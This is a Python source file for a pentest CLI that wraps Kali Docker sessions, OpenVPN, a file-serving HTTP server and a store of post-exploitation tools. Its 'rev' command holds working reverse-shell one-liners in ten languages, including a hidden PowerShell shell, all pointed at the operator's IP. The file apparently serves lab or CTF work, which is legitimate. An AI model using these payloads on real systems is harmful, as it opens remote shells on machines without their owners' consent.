import sys
import os
from Logger import Logger
from .workspace import Workspace
from .docker_manager import DockerManager
from datetime import datetime
import uuid
import json

class CommandManager:
    def __init__(self, docker_mgr: DockerManager):
        self.docker_mgr = docker_mgr
        self.commands = {
            "exit": self.cmd_exit,
            "quit": self.cmd_exit,
            "help": self.cmd_help,
            "nexus": self.cmd_nexus,
            "session": self.cmd_session,
            "history": self.cmd_history,
            "note": self.cmd_note,
            "notes": self.cmd_notes,
            "env": self.cmd_env,
            "ovpn": self.cmd_ovpn,
            "upload": self.cmd_upload,
            "download": self.cmd_download,
            "server": self.cmd_server,
            "rev": self.cmd_rev,
            "fetch": self.cmd_fetch
        }
        self.tools_file = os.path.join(os.path.dirname(os.path.dirname(__file__)), "tools.json")
        self._load_tools()

    def _load_tools(self):
        self.tools = {
            "linpeas": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
            "winpeas": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe",
            "pspy64": "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64",
            "pspy32": "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32",
            "chisel-linux": "https://github.com/jpillora/chisel/releases/latest/download/chisel_1.9.1_linux_amd64.gz",
            "chisel-windows": "https://github.com/jpillora/chisel/releases/latest/download/chisel_1.9.1_windows_amd64.gz",
            "ligolo-proxy": "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz",
            "ligolo-agent": "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip"
        }
        if os.path.exists(self.tools_file):
            try:
                with open(self.tools_file, "r") as f:
                    custom_tools = json.load(f)
                    self.tools.update(custom_tools)
            except Exception:
                pass
        else:
            self._save_tools()

    def _save_tools(self):
        try:
            with open(self.tools_file, "w") as f:
                json.dump(self.tools, f, indent=4)
        except Exception:
            pass

    def execute(self, command_line: str, workspace: Workspace):
        parts = command_line.split()
        if not parts:
            return
        cmd_name = parts[0].lower()
        if cmd_name in self.commands:
            self.commands[cmd_name](parts[1:], workspace)
        else:
            Logger.warning(f"Unknown command: {cmd_name}.")
            Logger.warning("Hacking tools must be run inside a session now.")
            Logger.info("-> Type 'nexus session new' to open a real interactive terminal")

    def cmd_exit(self, args, workspace: Workspace):
        raise KeyboardInterrupt

    def cmd_help(self, args, workspace: Workspace):
        Logger.info("Available commands:")
        Logger.info("- nexus session new [name]   : Create and enter a new terminal (session)")
        Logger.info("- nexus session bg <id> <cmd>: Run a command in background, capture output")
        Logger.info("- nexus session logs <id>    : Show output of a background session")
        Logger.info("- nexus session list          : List sessions")
        Logger.info("- nexus session open <id>     : Re-enter a session (fresh shell)")
        Logger.info("- nexus session del <id>      : Remove a session")
        Logger.info("- nexus ovpn start <file.ovpn> : Start VPN (OpenVPN) Host + VM in background")
        Logger.info("- nexus ovpn stop              : Stop VPN (OpenVPN) Host + VM")
        Logger.info("- nexus ovpn status            : Show VPN (OpenVPN) connection state")
        Logger.info("- nexus server start <port>   : Start a background HTTP server in the VM")
        Logger.info("- nexus server stop           : Stop the background HTTP server")
        Logger.info("- nexus server upload <file>  : Upload file to server and show wget command")
        Logger.info("- nexus rev <type> <port>     : Generate reverse shell payload (bash, nc, python...)")
        Logger.info("- nexus fetch <tool>          : Download a tool from the store to /workspace")
        Logger.info("- nexus fetch list            : Show available tools in the store")
        Logger.info("- nexus fetch add <name> <url>: Add a custom tool to the store")
        Logger.info("- nexus env set <key> <value> : Set an environment variable for all sessions")
        Logger.info("- nexus env del <key>         : Remove an environment variable")
        Logger.info("- nexus env list              : Show all environment variables")
        Logger.info('- nexus note "text"           : Add a note to the workspace')
        Logger.info("- nexus notes                 : Show all notes")
        Logger.info("- nexus history               : Show workspace command history")
        Logger.info("- upload <windows_path>       : [Nexus menu] Copy from Windows -> /workspace")
        Logger.info("- upload <container_path>     : [Inside session] Copy from VM -> /workspace")
        Logger.info("- download <filename>         : Copy from /workspace -> Windows folder")
        Logger.info("- exit / quit")

    def cmd_nexus(self, args, workspace: Workspace):
        if not args:
            self.cmd_help([], workspace)
            return
        subcmd = args[0]
        if subcmd == "session":
            self.cmd_session(args[1:], workspace)
        elif subcmd == "history":
            self.cmd_history(args[1:], workspace)
        elif subcmd == "note":
            self.cmd_note(args[1:], workspace)
        elif subcmd == "notes":
            self.cmd_notes(args[1:], workspace)
        elif subcmd == "env":
            self.cmd_env(args[1:], workspace)
        elif subcmd == "ovpn":
            self.cmd_ovpn(args[1:], workspace)
        elif subcmd == "server":
            self.cmd_server(args[1:], workspace)
        elif subcmd == "rev":
            self.cmd_rev(args[1:], workspace)
        elif subcmd == "fetch":
            self.cmd_fetch(args[1:], workspace)
        else:
            Logger.warning(f"Unknown nexus subcommand: {subcmd}")

    def cmd_history(self, args, workspace: Workspace):
        if not workspace.history:
            Logger.info("History is empty.")
            return
        Logger.info(f"--- Command history for {workspace.name} ---")
        for i, cmd in enumerate(workspace.history):
            Logger.log_color(f"{i+1}: {cmd}", "#A0A0A0")

    def cmd_session(self, args, workspace: Workspace):
        if not args:
            Logger.warning("Please specify an action: new / bg / logs / list / open / del")
            return

        action = args[0].lower()

        if action == "new":
            session_id = args[1] if len(args) > 1 else str(uuid.uuid4())[:8]
            workspace.sessions[session_id] = {
                "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "type": "interactive"
            }
            Logger.success(f"New session created: {session_id}")
            self.docker_mgr.open_session(workspace.name, session_id, workspace.env)

        elif action == "bg":
            if len(args) < 3:
                Logger.error("Usage: nexus session bg <id> <command>")
                return
            sess_id = args[1]
            cmd = ' '.join(args[2:])
            workspace.sessions[sess_id] = {
                "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "type": "background",
                "cmd": cmd
            }
            if self.docker_mgr.run_background_session(workspace.name, sess_id, cmd):
                Logger.success(f"Background session '{sess_id}' started: {cmd}")
                Logger.info(f"Use 'nexus session logs {sess_id}' to view output")

        elif action == "logs":
            if len(args) < 2:
                Logger.error("Please provide a session ID")
                return
            sess_id = args[1]
            output = self.docker_mgr.get_session_logs(workspace.name, sess_id)
            if output is None:
                Logger.error(f"No logs found for session '{sess_id}'. Is it a background session?")
            else:
                Logger.info(f"--- Logs: {sess_id} ---")
                print(output)

        elif action == "list":
            if not workspace.sessions:
                Logger.warning("No session created yet.")
                return
            Logger.info(f"--- Sessions for workspace {workspace.name} ---")
            for sid, data in workspace.sessions.items():
                kind = data.get("type", "interactive")
                extra = f"  cmd: {data['cmd']}" if kind == "background" else ""
                color = "#4CA3FF" if kind == "interactive" else "#ff8c00"
                Logger.log_color(f"  [{sid}]  {kind}  created: {data['created_at']}{extra}", color)

        elif action == "open":
            if len(args) < 2:
                Logger.error("Please provide a session ID")
                return
            sess_id = args[1]
            if sess_id in workspace.sessions:
                self.docker_mgr.open_session(workspace.name, sess_id, workspace.env)
            else:
                Logger.error(f"Session '{sess_id}' does not exist.")

        elif action == "del":
            if len(args) < 2:
                Logger.error("Please provide a session ID to delete")
                return
            sess_id = args[1]
            if sess_id in workspace.sessions:
                del workspace.sessions[sess_id]
                Logger.success(f"Session '{sess_id}' removed.")
            else:
                Logger.error(f"Session '{sess_id}' does not exist.")

        else:
            Logger.warning(f"Unknown session action: {action}")

    def cmd_env(self, args, workspace: Workspace):
        if not args:
            Logger.warning("Usage: nexus env set <key> <value> | nexus env del <key> | nexus env list")
            return
        action = args[0].lower()
        if action == "set":
            if len(args) < 3:
                Logger.error("Usage: nexus env set <key> <value>")
                return
            key, value = args[1], ' '.join(args[2:])
            workspace.env[key] = value
            Logger.success(f"Env var set: {key}={value}")
        elif action == "del":
            if len(args) < 2:
                Logger.error("Usage: nexus env del <key>")
                return
            key = args[1]
            if key in workspace.env:
                del workspace.env[key]
                Logger.success(f"Env var '{key}' removed.")
            else:
                Logger.error(f"Env var '{key}' not found.")
        elif action == "list":
            if not workspace.env:
                Logger.info("No environment variables set. Use 'nexus env set <key> <value>'.")
                return
            Logger.info(f"--- Env vars for workspace {workspace.name} ---")
            for k, v in workspace.env.items():
                Logger.log_color(f"  {k}={v}", "#f0c040")
        else:
            Logger.warning(f"Unknown env action: {action}")

    def cmd_ovpn(self, args, workspace: Workspace):
        if not args:
            Logger.warning("Usage: nexus ovpn start <file.ovpn> | nexus ovpn stop | nexus ovpn status")
            return
        action = args[0].lower()

        if action == "start":
            if len(args) < 2:
                Logger.error("Usage: nexus ovpn start <file.ovpn>")
                return
            ovpn_file = args[1]
            
            Logger.info("Starting OpenVPN in Kali VM...")
            self.docker_mgr.start_ovpn(workspace.name, ovpn_file)
            
            import shutil
            import subprocess
            import json
            import sys
            
            pid = None
            gui_started = False
            ovpn_connect_id = None
            ovpn_abs_path = os.path.join(os.getcwd(), "workspaces", workspace.name, ovpn_file)
            
            if not os.path.exists(ovpn_abs_path):
                Logger.error(f"File '{ovpn_abs_path}' not found on host.")
            else:
                if sys.platform == "win32":
                    windows_ovpn_exe = shutil.which("openvpn") or (r"C:\Program Files\OpenVPN\bin\openvpn.exe" if os.path.exists(r"C:\Program Files\OpenVPN\bin\openvpn.exe") else None)
                    windows_ovpn_connect = r"C:\Program Files\OpenVPN Connect\OpenVPNConnect.exe" if os.path.exists(r"C:\Program Files\OpenVPN Connect\OpenVPNConnect.exe") else None
                    if windows_ovpn_connect:
                        Logger.info("OpenVPN Connect found. Importing and connecting...")
                        try:
                            res = subprocess.run(f'"{windows_ovpn_connect}" --import-profile="{ovpn_abs_path}"', shell=True, capture_output=True, text=True)
                            try:
                                data = json.loads(res.stdout)
                                if data.get("status") == "success":
                                    ovpn_connect_id = data["message"]["id"]
                                    Logger.success(f"Profile imported (ID: {ovpn_connect_id}). Connecting...")
                                    subprocess.run(f'"{windows_ovpn_connect}" --connect={ovpn_connect_id} --minimize', shell=True)
                                else:
                                    Logger.error(f"Import failed: {data.get('error')}")
                            except json.JSONDecodeError:
                                Logger.error("Failed to parse OpenVPN Connect output.")
                                print(res.stdout)
                        except Exception as e:
                            Logger.error(f"Failed to run OpenVPN Connect: {e}")
                    elif windows_ovpn_exe:
                        Logger.info("OpenVPN CLI found on Windows. Starting local VPN seamlessly...")
                        try:
                            log_file = os.path.join(os.getcwd(), "workspaces", workspace.name, ".nexus_host_ovpn.log")
                            cmd = [windows_ovpn_exe, "--config", ovpn_abs_path]
                            with open(log_file, "w") as f:
                                p = subprocess.Popen(cmd, stdout=f, stderr=subprocess.STDOUT, creationflags=0x00000008 | 0x08000000)
                                pid = p.pid
                            Logger.success("Windows OpenVPN started in background (requires admin rights if no adapter exists).")
                        except Exception as e:
                            Logger.error(f"Failed to start OpenVPN on Windows: {e}")
                    else:
                        Logger.warning("OpenVPN CLI not found on Windows. Opening the file with your default app (OpenVPN Connect)...")
                        try:
                            os.startfile(ovpn_abs_path)
                            Logger.info("-> Please complete the connection in the OpenVPN GUI that just popped up.")
                            gui_started = True
                        except Exception as e:
                            Logger.error(f"Failed to open .ovpn file on Windows: {e}")
                else:
                    linux_ovpn_exe = shutil.which("openvpn")
                    if linux_ovpn_exe:
                        Logger.info("OpenVPN found on host. Starting local VPN...")
                        try:
                            log_file = os.path.join(os.getcwd(), "workspaces", workspace.name, ".nexus_host_ovpn.log")
                            cmd = ["sudo", linux_ovpn_exe, "--config", ovpn_abs_path]
                            with open(log_file, "w") as f:
                                p = subprocess.Popen(cmd, stdout=f, stderr=subprocess.STDOUT)
                                pid = p.pid
                            Logger.success("Host OpenVPN started in background (you may be prompted for sudo password in terminal).")
                        except Exception as e:
                            Logger.error(f"Failed to start OpenVPN on Host: {e}")
                    else:
                        Logger.warning("OpenVPN not found on Host. Running ONLY in Kali VM.")

            workspace.ovpn = {
                "file": ovpn_file,
                "host_pid": pid,
                "windows_gui": gui_started,
                "ovpn_connect_id": ovpn_connect_id,
                "host_supported": True if (sys.platform == "win32" and (pid or gui_started or ovpn_connect_id)) else bool(pid)
            }
            Logger.info("Use 'nexus ovpn status' to check connection.")

        elif action == "stop":
            Logger.info("Stopping OpenVPN processes...")
            self.docker_mgr.stop_ovpn(workspace.name)
            
            pid = workspace.ovpn.get("host_pid")
            connect_id = workspace.ovpn.get("ovpn_connect_id")
            
            import sys
            if connect_id and sys.platform == "win32":
                windows_ovpn_connect = r"C:\Program Files\OpenVPN Connect\OpenVPNConnect.exe"
                os.system(f'"{windows_ovpn_connect}" --disconnect >nul 2>&1')
                os.system(f'"{windows_ovpn_connect}" --remove-profile={connect_id} >nul 2>&1')
            elif pid:
                if sys.platform == "win32":
                    os.system(f"taskkill /F /PID {pid} >nul 2>&1")
                else:
                    os.system("sudo pkill -f 'openvpn --config' >/dev/null 2>&1")
            elif workspace.ovpn.get("windows_gui"):
                Logger.info("Note: You must manually disconnect in the OpenVPN Connect GUI on Windows.")
            
            workspace.ovpn = {}
            Logger.success("VPN stopped on all machines.")

        elif action == "status":
            Logger.info("--- VPN Status ---")
            vm_status = self.docker_mgr.get_ovpn_status(workspace.name)
            if vm_status["running"]:
                ip_str = vm_status.get('tun_ip') or 'fetching...'
                Logger.success(f"Kali VM : Connected (TUN IP: {ip_str})")
            else:
                Logger.log_color("Kali VM : Stopped", "#A0A0A0")
            
            import sys
            if workspace.ovpn.get("host_supported"):
                pid = workspace.ovpn.get("host_pid")
                connect_id = workspace.ovpn.get("ovpn_connect_id")
                
                if connect_id:
                    Logger.success("Host : Managed by OpenVPN Connect")
                elif pid:
                    import subprocess, re
                    running = False
                    if sys.platform == "win32":
                        proc = subprocess.run(f"tasklist /FI \"PID eq {pid}\"", shell=True, capture_output=True, text=True)
                        if str(pid) in proc.stdout: running = True
                    else:
                        proc = subprocess.run(["sudo", "kill", "-0", str(pid)], capture_output=True)
                        if proc.returncode == 0: running = True
                    
                    if running:
                        log_file = os.path.join(os.getcwd(), "workspaces", workspace.name, ".nexus_host_ovpn.log")
                        connected = False
                        ip = "?"
                        if os.path.exists(log_file):
                            with open(log_file, "r") as f:
                                content = f.read()
                                if "Initialization Sequence Completed" in content:
                                    connected = True
                                m = re.search(r'Notified TAP-Windows driver to set a DHCP IP/netmask of (\d+\.\d+\.\d+\.\d+)', content)
                                if m: ip = m.group(1)
                                else:
                                    m2 = re.search(r'IPv4 address(?:/mask)? (?:to )?(\d+\.\d+\.\d+\.\d+)', content)
                                    if m2: ip = m2.group(1)
                        if connected:
                            Logger.success(f"Host : Connected (TUN IP: {ip})")
                        else:
                            Logger.log_color("Host : Connecting... (Check log: .nexus_host_ovpn.log)", "#FFA500")
                    else:
                        Logger.error("Host : Process stopped unexpectedly. (Missing admin/sudo rights?)")
                elif workspace.ovpn.get("windows_gui"):
                    Logger.log_color("Host : Controlled via OpenVPN Connect GUI (check systray)", "#1da1f2")
                else:
                    Logger.log_color("Host : Stopped", "#A0A0A0")
            else:
                Logger.log_color("Host : Feature unavailable (OpenVPN CLI not installed locally)", "#A0A0A0")
        else:
            Logger.warning(f"Unknown ovpn action: {action}")

    def cmd_server(self, args, workspace: Workspace):
        if not args:
            Logger.warning("Usage: nexus server start <port> | nexus server stop | nexus server upload <file>")
            return
        action = args[0].lower()

        if action == "start":
            port = 8000
            if len(args) > 1 and args[1].isdigit():
                port = int(args[1])
            else:
                Logger.info(f"No port specified, using default {port}.")
            
            self.docker_mgr.start_http_server(workspace.name, port)
            workspace.server = {"running": True, "port": port}
            
            ip_str = "your_vpn_ip"
            try:
                vm_status = self.docker_mgr.get_ovpn_status(workspace.name)
                if vm_status.get("running") and vm_status.get("tun_ip"):
                    ip_str = vm_status["tun_ip"].split("/")[0]
            except Exception:
                pass
                
            Logger.success(f"HTTP Server started in background on port {port}.")
            Logger.info(f"Target can download files via: wget http://{ip_str}:{port}/<file>")

        elif action == "stop":
            self.docker_mgr.stop_http_server(workspace.name)
            workspace.server = {"running": False, "port": None}
            Logger.success("HTTP Server stopped.")
            
        elif action == "upload":
            if len(args) < 2:
                Logger.error("Usage: nexus server upload <local_windows_file> [remote_name]")
                return
            
            import os
            src_path = args[1]
            if not os.path.isabs(src_path):
                src_path = os.path.abspath(src_path)
            
            if not os.path.exists(src_path):
                Logger.error(f"File not found: {src_path}")
                return
                
            dest_name = os.path.basename(src_path)
            if len(args) == 3:
                dest_name = args[2]
                
            self.cmd_upload(args[1:], workspace)
            
            port = workspace.server.get("port", 8000)
            ip_str = "your_vpn_ip"
            try:
                vm_status = self.docker_mgr.get_ovpn_status(workspace.name)
                if vm_status.get("running") and vm_status.get("tun_ip"):
                    ip_str = vm_status["tun_ip"].split("/")[0]
            except Exception:
                pass
            
            Logger.success(f"File ready for target!")
            Logger.info(f"Command: wget http://{ip_str}:{port}/{dest_name}")
            
        else:
            Logger.warning(f"Unknown server action: {action}")

    def cmd_rev(self, args, workspace: Workspace):
        if len(args) < 2:
            Logger.warning("Usage: nexus rev <type> <port>")
            Logger.info("Types  : bash, nc, python, php, powershell, perl, awk, socat, java, ruby")
            Logger.info("Example: nexus rev bash 4444")
            return
            
        rev_type = args[0].lower()
        port = args[1]
        
        ip_str = "YOUR_VPN_IP"
        try:
            vm_status = self.docker_mgr.get_ovpn_status(workspace.name)
            if vm_status.get("running") and vm_status.get("tun_ip"):
                ip_str = vm_status["tun_ip"].split("/")[0]
        except Exception:
            pass

        payloads = {
            "bash": f"bash -c 'bash -i >& /dev/tcp/{ip_str}/{port} 0>&1'",
            "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip_str} {port} >/tmp/f",
            "python": f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip_str}\",{int(port) if port.isdigit() else port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
            "php": f"php -r '$sock=fsockopen(\"{ip_str}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip_str}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            "perl": f"perl -e 'use Socket;$i=\"{ip_str}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
            "awk": f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip_str}/{port}\"; while(42) {{ do{{ printf \"shell> \" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}'",
            "socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip_str}:{port}",
            "java": f"r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip_str}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip_str}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        }

        if rev_type not in payloads:
            Logger.error(f"Unknown payload type '{rev_type}'. Available: {', '.join(payloads.keys())}")
            return
            
        Logger.success(f"--- Payload {rev_type.upper()} ---")
        print()
        Logger.log_color(payloads[rev_type], "#0ba5d4")
        print()
        Logger.info(f"Don't forget to listen! ->  nexus session new 'nc -lvnp {port}'")

    def cmd_fetch(self, args, workspace: Workspace):
        if not args:
            Logger.warning("Usage: nexus fetch <tool> | nexus fetch add <name> <url> | nexus fetch list")
            return
        
        action = args[0].lower()
        if action == "list":
            Logger.info("--- 📦 Tools Store ---")
            for t, url in self.tools.items():
                Logger.log_color(f"- {t:<15} : {url}", "#A0A0A0")
            print()
            Logger.info("To add a tool: nexus fetch add <name> <url>")
            Logger.info("To download  : nexus fetch <name>")
            
        elif action == "add":
            if len(args) < 3:
                Logger.error("Usage: nexus fetch add <name> <url>")
                return
            name = args[1].lower()
            url = args[2]
            self.tools[name] = url
            self._save_tools()
            Logger.success(f"Tool '{name}' added successfully to the store!")
            
        else:
            name = action
            if name not in self.tools:
                Logger.error(f"Tool '{name}' not found in the store.")
                Logger.info("Type 'nexus fetch list' to see available tools.")
                return
            
            url = self.tools[name]
            dest_name = url.split("/")[-1]
            if "?" in dest_name:
                dest_name = dest_name.split("?")[0]
                
            Logger.info(f"Fetching {name} from {url}...")
            
            cmd = f"wget -q --show-progress -O /workspace/{dest_name} {url}"
            container_name = f"nexus_workspace_{workspace.name}"
            
            try:
                container = self.docker_mgr.client.containers.get(container_name)
                cmd = f"wget -q -O /workspace/{dest_name} {url}"
                exit_code, _ = container.exec_run(["bash", "-c", cmd])
                if exit_code == 0:
                    Logger.success(f"Tool '{name}' downloaded to /workspace/{dest_name} (shared with Windows)!")
                    Logger.info(f"-> Use 'nexus server upload {dest_name}' to serve it to the target.")
                else:
                    Logger.error(f"Failed to download {name} (wget exit code {exit_code}). Make sure the URL is valid.")
            except Exception as e:
                Logger.error(f"Failed to execute fetch: {e}")

    def cmd_note(self, args, workspace: Workspace):
        if not args:
            Logger.warning('Usage: nexus note "your note text"')
            return
        note_text = ' '.join(args)
        workspace.notes.append({
            "text": note_text,
            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        Logger.success(f"Note saved.")

    def cmd_notes(self, args, workspace: Workspace):
        if not workspace.notes:
            Logger.info("No notes yet. Use 'nexus note \"text\"' to add one.")
            return
        Logger.info(f"--- Notes for workspace {workspace.name} ---")
        for i, note in enumerate(workspace.notes):
            Logger.log_color(f"  [{i+1}] {note['created_at']}  {note['text']}", "#d4a0ff")

    def cmd_upload(self, args, workspace: Workspace):
        if not args:
            Logger.warning("Usage: upload <local_windows_file> [remote_name]")
            return
        import shutil
        src_path = args[0]
        if not os.path.exists(src_path):
            Logger.error(f"File {src_path} not found on your Windows PC.")
            return
        dest_name = args[1] if len(args) > 1 else os.path.basename(src_path)
        workspace_dir = os.path.join(os.getcwd(), "workspaces", workspace.name)
        dest_path = os.path.join(workspace_dir, dest_name)
        try:
            if os.path.isfile(src_path):
                shutil.copy2(src_path, dest_path)
                Logger.success(f"File uploaded! It is now available in the Kali VM at: /workspace/{dest_name}")
            else:
                shutil.copytree(src_path, dest_path, dirs_exist_ok=True)
                Logger.success(f"Directory uploaded! It is now available in the Kali VM at: /workspace/{dest_name}")
        except Exception as e:
            Logger.error(f"Error during upload: {e}")

    def cmd_download(self, args, workspace: Workspace):
        if not args:
            Logger.warning("Usage: download <file_in_workspace> [local_windows_folder]")
            return
        import shutil
        remote_name = args[0]
        workspace_dir = os.path.join(os.getcwd(), "workspaces", workspace.name)
        src_path = os.path.join(workspace_dir, remote_name)
        if not os.path.exists(src_path):
            Logger.error(f"File {remote_name} not found in the Kali VM (/workspace/{remote_name}).")
            return
        dest_dir = args[1] if len(args) > 1 else os.getcwd()
        os.makedirs(dest_dir, exist_ok=True)
        dest_path = os.path.join(dest_dir, os.path.basename(src_path))
        try:
            if os.path.isfile(src_path):
                shutil.copy2(src_path, dest_path)
            else:
                shutil.copytree(src_path, dest_path, dirs_exist_ok=True)
            Logger.success(f"File downloaded successfully to your Windows PC at: {dest_path}")
        except Exception as e:
            Logger.error(f"Error during download: {e}")
